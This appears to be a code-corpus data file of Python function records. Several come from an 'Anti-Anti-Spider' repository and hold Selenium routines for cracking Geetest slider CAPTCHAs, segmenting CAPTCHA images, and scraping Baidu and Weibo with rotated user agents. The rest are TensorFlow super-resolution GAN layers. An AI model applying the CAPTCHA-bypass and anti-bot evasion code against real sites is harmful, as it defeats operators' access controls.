{"docstring": "\"\"\"\u9f20\u6807\u79fb\u52a8\u5230\u7f51\u9875\u5143\u7d20\u4e0a\n\n:element: \u76ee\u6807\u7f51\u9875\u5143\u7d20\n\n\"\"\"\n", "func_signal": "def move_to_element(self, element_class=\"gt_slider_knob\"):\n", "code": "time.sleep(3)\nelement = self.driver.find_element_by_class_name(element_class)\naction = ActionChains(self.driver)\naction.move_to_element(element).perform()\ntime.sleep(4.5)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/geetest.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "\"\"\"\u622a\u53d6\u9a8c\u8bc1\u7801\u56fe\u7247\n\n:element_id: \u9a8c\u8bc1\u7801\u56fe\u7247\u7f51\u9875\u5143\u7d20id\n:returns: StringIO, \u56fe\u7247\u5185\u5bb9\n\n\"\"\"\n", "func_signal": "def crop_captcha_image(self, element_id=\"gt_box\"):\n", "code": "captcha_el = self.driver.find_element_by_class_name(element_id)\nlocation = captcha_el.location\nsize = captcha_el.size\nbrowser_x_offset = 0\nbrowser_y_offset = 0\nif 'phantomjs' == self.get_browser_name():\n    browser_x_offset += 171\n    browser_y_offset += 7\nleft = int(location['x'] + browser_x_offset)\ntop = int(location['y'] + browser_y_offset)\nright = int(location['x'] + browser_x_offset + size['width'])\nbottom = int(location['y'] + browser_y_offset + size['height'])\n\nscreenshot = self.driver.get_screenshot_as_png()\n\nscreenshot = Image.open(StringIO.StringIO(screenshot))\ncaptcha = screenshot.crop((left, top, right, bottom))\ncaptcha.save(\"%s.png\" % uuid.uuid4().get_hex())\nreturn captcha", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/geetest.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "''' \u5b57\u7b26\u5207\u5272,\u6839\u636e\u9ed1\u8272\u7684\u8fde\u7eed\u6027,\u5f53\u67d0\u4e00\u5217\u51fa\u73b0\u9ed1\u8272\u4e3a\u6807\u5fd7,\u5f53\u9ed1\u8272\u6d88\u5931\u4e3a\u7ed3\u675f\u70b9'''\n", "func_signal": "def cut_image(image):\n", "code": "inletter=False\nfoundletter=False\nletters=[]\nstart=0\nend=0\nfor x in range(image.size[0]):\n    for y in range(image.size[1]):\n        pix=image.getpixel((x,y))\n        if(pix==0):\n            inletter=True\n    if foundletter==False and inletter ==True:\n        foundletter=True\n        start=x\n    if foundletter==True and inletter==False:\n        end=x\n        letters.append((start,end))\n        foundletter=False\n    inletter=False\nimages=[]\nfor letter in letters:\n    img=image.crop((letter[0],0,letter[1],image.size[1]))\n    #img.save(str(letter[0])+'.png')#\u5c55\u793a\u5207\u5272\u6548\u679c\n    img.save(\"./cat/\"+str(int(time.time()))+'.png')#\u5c55\u793a\u5207\u5272\u6548\u679c\n    images.append(img)\nreturn images", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/1.\u9a8c\u8bc1\u7801/num\u526f\u672c/recognise.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "# browser = webdriver.PhantomJS()\n", "func_signal": "def getid(self):\n", "code": "browser = webdriver.Chrome()\nbrowser.implicitly_wait(10)\n# browser.set_script_timeout(10)\n# browser.set_page_load_timeout(10)\nfor url in self.URLLIST:\n    browser.get(url)\n    regx = r'http[s]*://baijiahao.baidu.com/u[\\S]*id=[0-9]*'\n    pattern = re.compile(regx)\n    match = re.findall(pattern, browser.page_source)\n    time.sleep(1)\n    try:\n        print(match[0])\n        self._writeappid(match[0])\n    except Exception as e:\n        print('\u5339\u914d\u5931\u8d25')", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/11.\u767e\u5bb6\u53f7/get_id/baijiahao.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "''' \u56fe\u7247\u8f6c\u6362\u6210\u77e2\u91cf,\u5c06\u4e8c\u7ef4\u7684\u56fe\u7247\u8f6c\u4e3a\u4e00\u7ef4'''\n", "func_signal": "def buildvector(image):\n", "code": "result={}\ncount=0\nfor i in image.getdata():\n    result[count]=i\n    count+=1\n#print result\nreturn result", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/1.\u9a8c\u8bc1\u7801/num\u526f\u672c/recognise.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "'''\u8c03\u7528\u4ee5\u4e0a\u51fd\u6570\u89e3\u51b3\u6211\u4eec\u7684\u95ee\u9898'''\n# browser = webdriver.Chrome()\n", "func_signal": "def sobaidu(self):\n", "code": "browser = webdriver.PhantomJS()\nnum = 0\nfor key in self.KEYLIST:\n    ''''doc'''\n    num += 1\n    now_num = 0\n    browser.implicitly_wait(30)\n    browser.get(\n        'https://www.baidu.com/s?wd=site:(baijiahao.baidu.com)' + key)\n    while True:\n        if now_num == 1:\n            try:\n                browser.find_element_by_xpath(\n                    '//*[@id=\"page\"]/a[10]').click()\n                time.sleep(2)\n            except Exception as e:\n                print(e)\n                print(\"\u6709\u95ee\u9898\")\n                break\n        now_num += 1\n        print(now_num)\n        source = browser.page_source\n        soup = bs4.BeautifulSoup(source, 'lxml')\n        print('next_page')\n        for i in soup.findAll(class_='result c-container '):\n            url = i.find(class_='t').find('a').get('href')\n            # print(url)\n            # self.URLLIST.add(self._changeurl(url))\n            self._writetofile(self._changeurl(url))\n        time.sleep(1)\n        if now_num > 1:\n            try:\n                browser.find_element_by_xpath(\n                    '//*[@id=\"page\"]/a[11]').click()\n                time.sleep(1)\n            except:\n                print('not find next_button may be for the page end!!!')\n                break", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/11.\u767e\u5bb6\u53f7/get_id/baijiahao.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "'''\u8f6c\u6362\u56fe\u7247\u5206\u8fa8\u7387'''\n", "func_signal": "def convertjpg(jpgfile, outdir, width=227,height=227):\n", "code": "img=Image.open(jpgfile)\ntry:\n    new_img=img.resize((width,height),Image.BILINEAR)\n    if img.mode == \"P\" or img.mode == \"RGBA\":\n        new_img = new_img.convert('RGB')\n    new_img.save(outdir)\nexcept Exception as e:\n    print(\"\u56fe\u7247\u8f6c\u6362\u5931\u8d25\",e)", "path": "Anti-Anti-Spider/sample/clear.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "''' \u56fe\u7247\u8f6c\u6362\u6210\u77e2\u91cf,\u5c06\u4e8c\u7ef4\u7684\u56fe\u7247\u8f6c\u4e3a\u4e00\u7ef4'''\n", "func_signal": "def buildvector(image):\n", "code": "result={}\ncount=0\nfor i in image.getdata():\n    result[count]=i\n    count+=1\nreturn result", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/1.\u9a8c\u8bc1\u7801/knn_num_captcha/recognise.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "'''\u591a\u7ebf\u7a0b\u542f\u52a8\u533a\u57df--\u65e0\u9700\u4fee\u6539'''\n", "func_signal": "def Thread_Handle(taskList, Total_TaskNum):\n", "code": "global THREAD_COUNT\nlock = threading.Lock()\nWorksThread = []\nevery_thread_number = len(taskList) / THREAD_COUNT\nif every_thread_number == 0:\n    THREAD_COUNT = len(taskList)\n    every_thread_number = 1\n\nfor i in range(THREAD_COUNT):\n    if i != THREAD_COUNT - 1:\n        source_list = taskList[\n            i * every_thread_number: (i + 1) * every_thread_number]\n        Work = Handle_HTML(lock, i, source_list, Total_TaskNum)\n    else:\n        source_list = taskList[i * every_thread_number:]\n        Work = Handle_HTML(lock, i, source_list, Total_TaskNum)\n    Work.start()\n    WorksThread.append(Work)\nfor Work in WorksThread:\n    Work.join()", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/16.csdn/UrlSpider.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "\"\"\"\u8f93\u5165\u67e5\u8be2\u5173\u952e\u8bcd\n\n:text: Unicode, \u8981\u8f93\u5165\u7684\u6587\u672c\n:element_id: \u8f93\u5165\u6846\u7f51\u9875\u5143\u7d20id\n\n\"\"\"\n", "func_signal": "def input_by_id(self, text=u\"\u4e2d\u56fd\u79fb\u52a8\", element_id=\"searchText\"):\n", "code": "input_el = self.driver.find_element_by_id(element_id)\ninput_el.clear()\ninput_el.send_keys(text)\ntime.sleep(3.5)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/geetest.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "\"\"\"\u6267\u884c\u7834\u89e3\u7a0b\u5e8f\n\n\"\"\"\n", "func_signal": "def crack(self):\n", "code": "self.input_by_id()\nself.click_by_id()\nx_offset = self.calculate_slider_offset()\nself.drag_and_drop(x_offset=x_offset)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/industry_and_commerce.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "'''\u8bfb\u53d6\u767e\u5ea6\u641c\u7d22\u6240\u9700\u8981\u7684\u6240\u6709\u5173\u952e\u8bcd'''\n", "func_signal": "def _readkey(self):\n", "code": "with open(self.KEYFILENAME) as keyklistfile:\n    for i in keyklistfile.readlines():\n        self.KEYLIST.add(i)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/11.\u767e\u5bb6\u53f7/get_id/baijiahao.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "#self.myheader = {'User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}\n", "func_signal": "def __init__(self,keyword,tm_start,tm_delta,conn,session):\n", "code": "self.url = 'http://s.weibo.com/weibo/'\nself.URL = self.url + urllib.quote(keyword) + '&typeall=1&suball=1&timescope=custom:'+str(tm_start)+':'+str(tm_start)+'&Refer=g'\nself.myheader = {'User-Agent':\"Mozilla/5.0 (hp-tablet; Linux; hpwOS/3.0.2; U; de-DE) AppleWebKit/534.6 (KHTML, like Gecko) wOSBrowser/234.40.1 Safari/534.6 TouchPad/1.0\"}\n# self.myheader = self.getHeader()\nself.conn = conn\nself.session = session", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/14.SinaSpider/SinaSpider-master/sinaCrawlforADSL.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "\"\"\"\u62d6\u62fd\u6ed1\u5757\n\n:x_offset: \u76f8\u5bf9\u6ed1\u5757x\u5750\u6807\u504f\u79fb\n:y_offset: \u76f8\u5bf9\u6ed1\u5757y\u5750\u6807\u504f\u79fb\n:element_class: \u6ed1\u5757\u7f51\u9875\u5143\u7d20CSS\u7c7b\u540d\n\n\"\"\"\n", "func_signal": "def drag_and_drop(self, x_offset=0, y_offset=0, element_class=\"gt_slider_knob\"):\n", "code": "dragger = self.driver.find_element_by_class_name(element_class)\naction = ActionChains(self.driver)\naction.drag_and_drop_by_offset(dragger, x_offset, y_offset).perform()\n# \u8fd9\u4e2a\u5ef6\u65f6\u5fc5\u987b\u6709\uff0c\u5728\u6ed1\u52a8\u540e\u7b49\u5f85\u56de\u590d\u539f\u72b6\ntime.sleep(8)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/5.\u6781\u9a8c\u9a8c\u8bc1\u7801\u8d44\u6e90\u6c47\u603b/\u4f01\u4e1a\u4fe1\u606f\u67e5\u8be2\u7834\u89e3/geetest.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "#fUserAgent = open('UserAgent.txt')\n#content = fUserAgent.read()\n#pattern = re.compile('User-Agent:.*[^\\n]')\n#UserAgentList = pattern.findall(content)\n#UserAgent = UserAgentList[random.choice(range(len(UserAgentList)))]\n#user_agent1, user_agent2 = UserAgent.split('User-Agent:')\n#Referers =['https://www.baidu.com/', 'http://http://s.weibo.com/weibo/%25E7%258E%258B%25E9%25B8%25A5%2B%25E5%259B%259E%25E5%25BA%2594&Refer=STopic_top',\n#           'https://www.google.com/','https://www.hao123.com/','http://www.sogou.com']\n#referer = random.choice(Referers)\n", "func_signal": "def getHeader(self):\n", "code": "user_agent = random.choice(user_agents.agents)\nmyheader = {'User-Agent':user_agent}\nreturn myheader", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/14.SinaSpider/SinaSpider-master/sinaCrawlforADSL.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "'''\u767e\u5ea6\u641c\u7d22\u7ed3\u679curl\u8f6c\u6362\u4e3a\u771f\u5b9e\u7684url'''\n", "func_signal": "def _changeurl(self, url):\n", "code": "try:\n    req = requests.get(url + '&wd=')\n    # time.sleep(1)\n    # print(req.text)\n    regx = r'http[s]*://baijiahao.baidu.com/[\\S]*id=[0-9]*'\n    pattern = re.compile(regx)\n    match = re.findall(pattern, req.text)\n    return match[0]\nexcept Exception as e:\n    print(e)", "path": "Anti-Anti-Spider/\u539fAnti-Anti-Spider/6.\u722c\u866b\u9879\u76ee\u6e90\u7801/11.\u767e\u5bb6\u53f7/get_id/baijiahao.py", "commit_date": "2020-04-21 00:00:00", "repo_name": "luyishisi/Anti-Anti-Spider", "stars": 7223, "license": "None", "language": "python", "size": 150743}
{"docstring": "\"\"\"Adds a transposed 2D convolutional layer\"\"\"\n\n", "func_signal": "def add_conv2d_transpose(self, num_units, mapsize=1, stride=1, stddev_factor=1.0):\n", "code": "assert len(self.get_output().get_shape()) == 4 and \"Previous layer must be 4-dimensional (batch, width, height, channels)\"\n\nwith tf.variable_scope(self._get_layer_str()):\n    prev_units = self._get_num_inputs()\n    \n    # Weight term and convolution\n    initw  = self._glorot_initializer_conv2d(prev_units, num_units,\n                                             mapsize,\n                                             stddev_factor=stddev_factor)\n    weight = tf.get_variable('weight', initializer=initw)\n    weight = tf.transpose(weight, perm=[0, 1, 3, 2])\n    prev_output = self.get_output()\n    output_shape = [FLAGS.batch_size,\n                    int(prev_output.get_shape()[1]) * stride,\n                    int(prev_output.get_shape()[2]) * stride,\n                    num_units]\n    out    = tf.nn.conv2d_transpose(self.get_output(), weight,\n                                    output_shape=output_shape,\n                                    strides=[1, stride, stride, 1],\n                                    padding='SAME')\n\n    # Bias term\n    initb  = tf.constant(0.0, shape=[num_units])\n    bias   = tf.get_variable('bias', initializer=initb)\n    out    = tf.nn.bias_add(out, bias)\n    \nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a sigmoid (0,1) activation function layer to this model.\"\"\"\n\n", "func_signal": "def add_sigmoid(self):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    prev_units = self._get_num_inputs()\n    out = tf.nn.sigmoid(self.get_output())\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Returns a variable given its layer and name.\n\nThe variable must already exist.\"\"\"\n\n", "func_signal": "def get_variable(self, layer, name):\n", "code": "scope      = self._get_layer_str(layer)\ncollection = tf.get_collection(tf.GraphKeys.VARIABLES, scope=scope)\n\n# TBD: Ugly!\nfor var in collection:\n    if var.name[:-2] == scope+'/'+name:\n        return var\n\nreturn None", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Demo based on images dumped during training\"\"\"\n\n# Get images that were dumped during training\n", "func_signal": "def demo1(sess):\n", "code": "filenames = tf.gfile.ListDirectory(FLAGS.train_dir)\nfilenames = sorted(filenames)\nfilenames = [os.path.join(FLAGS.train_dir, f) for f in filenames if f[-4:]=='.png']\n\nassert len(filenames) >= 1\n\nfps        = 30\n\n# Create video file from PNGs\nprint(\"Producing video file...\")\nfilename  = os.path.join(FLAGS.train_dir, 'demo1.mp4')\nclip      = mpe.ImageSequenceClip(filenames, fps=fps)\nclip.write_videofile(filename)\nprint(\"Done!\")", "path": "srez/srez_demo.py", "commit_date": "2016-08-26 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "# Generator\n", "func_signal": "def create_model(sess, features, labels):\n", "code": "rows      = int(features.get_shape()[1])\ncols      = int(features.get_shape()[2])\nchannels  = int(features.get_shape()[3])\n\ngene_minput = tf.placeholder(tf.float32, shape=[FLAGS.batch_size, rows, cols, channels])\n\n# TBD: Is there a better way to instance the generator?\nwith tf.variable_scope('gene') as scope:\n    gene_output, gene_var_list = \\\n                _generator_model(sess, features, labels, channels)\n\n    scope.reuse_variables()\n\n    gene_moutput, _ = _generator_model(sess, gene_minput, labels, channels)\n\n# Discriminator with real data\ndisc_real_input = tf.identity(labels, name='disc_real_input')\n\n# TBD: Is there a better way to instance the discriminator?\nwith tf.variable_scope('disc') as scope:\n    disc_real_output, disc_var_list = \\\n            _discriminator_model(sess, features, disc_real_input)\n\n    scope.reuse_variables()\n        \n    disc_fake_output, _ = _discriminator_model(sess, features, gene_output)\n\nreturn [gene_minput,      gene_moutput,\n        gene_output,      gene_var_list,\n        disc_real_output, disc_fake_output, disc_var_list]", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a ReLU activation function to this model\"\"\"\n\n", "func_signal": "def add_relu(self):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    out = tf.nn.relu(self.get_output())\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a leaky ReLU (LReLU) activation function to this model\"\"\"\n\n", "func_signal": "def add_lrelu(self, leak=.2):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    t1  = .5 * (1 + leak)\n    t2  = .5 * (1 - leak)\n    out = t1 * self.get_output() + \\\n          t2 * tf.abs(self.get_output())\n    \nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Initialization in the style of Glorot 2010.\n\nstddev_factor should be 1.0 for linear activations, and 2.0 for ReLUs\"\"\"\n\n", "func_signal": "def _glorot_initializer_conv2d(self, prev_units, num_units, mapsize, stddev_factor=1.0):\n", "code": "stddev  = np.sqrt(stddev_factor / (np.sqrt(prev_units*num_units)*mapsize*mapsize))\nreturn tf.truncated_normal([mapsize, mapsize, prev_units, num_units],\n                            mean=0.0, stddev=stddev)", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a batch normalization layer to this model.\n\nSee ArXiv 1502.03167v3 for details.\"\"\"\n\n# TBD: This appears to be very flaky, often raising InvalidArgumentError internally\n", "func_signal": "def add_batch_norm(self, scale=False):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    out = tf.contrib.layers.batch_norm(self.get_output(), scale=scale)\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "# I.e. did we correctly identify the input as real or not?\n", "func_signal": "def create_discriminator_loss(disc_real_output, disc_fake_output):\n", "code": "cross_entropy_real = tf.nn.sigmoid_cross_entropy_with_logits(disc_real_output, tf.ones_like(disc_real_output))\ndisc_real_loss     = tf.reduce_mean(cross_entropy_real, name='disc_real_loss')\n\ncross_entropy_fake = tf.nn.sigmoid_cross_entropy_with_logits(disc_fake_output, tf.zeros_like(disc_fake_output))\ndisc_fake_loss     = tf.reduce_mean(cross_entropy_fake, name='disc_fake_loss')\n\nreturn disc_real_loss, disc_fake_loss", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Differentiable image downscaling by a factor of K\"\"\"\n", "func_signal": "def _downscale(images, K):\n", "code": "arr = np.zeros([K, K, 3, 3])\narr[:,:,0,0] = 1.0/(K*K)\narr[:,:,1,1] = 1.0/(K*K)\narr[:,:,2,2] = 1.0/(K*K)\ndowscale_weight = tf.constant(arr, dtype=tf.float32)\n\ndownscaled = tf.nn.conv2d(images, dowscale_weight,\n                          strides=[1, K, K, 1],\n                          padding='SAME')\nreturn downscaled", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a residual block as per Arxiv 1512.03385, Figure 3\"\"\"\n\n", "func_signal": "def add_residual_block(self, num_units, mapsize=3, num_layers=2, stddev_factor=1e-3):\n", "code": "assert len(self.get_output().get_shape()) == 4 and \"Previous layer must be 4-dimensional (batch, width, height, channels)\"\n\n# Add projection in series if needed prior to shortcut\nif num_units != int(self.get_output().get_shape()[3]):\n    self.add_conv2d(num_units, mapsize=1, stride=1, stddev_factor=1.)\n\nbypass = self.get_output()\n\n# Residual block\nfor _ in range(num_layers):\n    self.add_batch_norm()\n    self.add_relu()\n    self.add_conv2d(num_units, mapsize=mapsize, stride=1, stddev_factor=stddev_factor)\n\nself.add_sum(bypass)\n\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Transforms the output of this network to a 1D tensor\"\"\"\n\n", "func_signal": "def add_flatten(self):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    batch_size = int(self.get_output().get_shape()[0])\n    out = tf.reshape(self.get_output(), [batch_size, -1])\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a bottleneck residual block as per Arxiv 1512.03385, Figure 3\"\"\"\n\n", "func_signal": "def add_bottleneck_residual_block(self, num_units, mapsize=3, stride=1, transpose=False):\n", "code": "assert len(self.get_output().get_shape()) == 4 and \"Previous layer must be 4-dimensional (batch, width, height, channels)\"\n\n# Add projection in series if needed prior to shortcut\nif num_units != int(self.get_output().get_shape()[3]) or stride != 1:\n    ms = 1 if stride == 1 else mapsize\n    #bypass.add_batch_norm() # TBD: Needed?\n    if transpose:\n        self.add_conv2d_transpose(num_units, mapsize=ms, stride=stride, stddev_factor=1.)\n    else:\n        self.add_conv2d(num_units, mapsize=ms, stride=stride, stddev_factor=1.)\n\nbypass = self.get_output()\n\n# Bottleneck residual block\nself.add_batch_norm()\nself.add_relu()\nself.add_conv2d(num_units//4, mapsize=1,       stride=1,      stddev_factor=2.)\n\nself.add_batch_norm()\nself.add_relu()\nif transpose:\n    self.add_conv2d_transpose(num_units//4,\n                              mapsize=mapsize,\n                              stride=1,\n                              stddev_factor=2.)\nelse:\n    self.add_conv2d(num_units//4,\n                    mapsize=mapsize,\n                    stride=1,\n                    stddev_factor=2.)\n\nself.add_batch_norm()\nself.add_relu()\nself.add_conv2d(num_units,    mapsize=1,       stride=1,      stddev_factor=2.)\n\nself.add_sum(bypass)\n\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "# I.e. did we fool the discriminator?\n", "func_signal": "def create_generator_loss(disc_output, gene_output, features):\n", "code": "cross_entropy = tf.nn.sigmoid_cross_entropy_with_logits(disc_output, tf.ones_like(disc_output))\ngene_ce_loss  = tf.reduce_mean(cross_entropy, name='gene_ce_loss')\n\n# I.e. does the result look like the feature?\nK = int(gene_output.get_shape()[1])//int(features.get_shape()[1])\nassert K == 2 or K == 4 or K == 8    \ndownscaled = _downscale(gene_output, K)\n\ngene_l1_loss  = tf.reduce_mean(tf.abs(downscaled - features), name='gene_l1_loss')\n\ngene_loss     = tf.add((1.0 - FLAGS.gene_l1_factor) * gene_ce_loss,\n                       FLAGS.gene_l1_factor * gene_l1_loss, name='gene_loss')\n\nreturn gene_loss", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a 2D convolutional layer.\"\"\"\n\n", "func_signal": "def add_conv2d(self, num_units, mapsize=1, stride=1, stddev_factor=1.0):\n", "code": "assert len(self.get_output().get_shape()) == 4 and \"Previous layer must be 4-dimensional (batch, width, height, channels)\"\n\nwith tf.variable_scope(self._get_layer_str()):\n    prev_units = self._get_num_inputs()\n    \n    # Weight term and convolution\n    initw  = self._glorot_initializer_conv2d(prev_units, num_units,\n                                             mapsize,\n                                             stddev_factor=stddev_factor)\n    weight = tf.get_variable('weight', initializer=initw)\n    out    = tf.nn.conv2d(self.get_output(), weight,\n                          strides=[1, stride, stride, 1],\n                          padding='SAME')\n\n    # Bias term\n    initb  = tf.constant(0.0, shape=[num_units])\n    bias   = tf.get_variable('bias', initializer=initb)\n    out    = tf.nn.bias_add(out, bias)\n    \nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a layer that sums the top layer with the given term\"\"\"\n\n", "func_signal": "def add_sum(self, term):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    prev_shape = self.get_output().get_shape()\n    term_shape = term.get_shape()\n    #print(\"%s %s\" % (prev_shape, term_shape))\n    assert prev_shape == term_shape and \"Can't sum terms with a different size\"\n    out = tf.add(self.get_output(), term)\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a ELU activation function to this model\"\"\"\n\n", "func_signal": "def add_elu(self):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    out = tf.nn.elu(self.get_output())\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
{"docstring": "\"\"\"Adds a softmax operation to this model\"\"\"\n\n", "func_signal": "def add_softmax(self):\n", "code": "with tf.variable_scope(self._get_layer_str()):\n    this_input = tf.square(self.get_output())\n    reduction_indices = list(range(1, len(this_input.get_shape())))\n    acc = tf.reduce_sum(this_input, reduction_indices=reduction_indices, keep_dims=True)\n    out = this_input / (acc+FLAGS.epsilon)\n    #out = tf.verify_tensor_all_finite(out, \"add_softmax failed; is sum equal to zero?\")\n\nself.outputs.append(out)\nreturn self", "path": "srez/srez_model.py", "commit_date": "2016-10-18 00:00:00", "repo_name": "david-gpu/srez", "stars": 5295, "license": "mit", "language": "python", "size": 207}
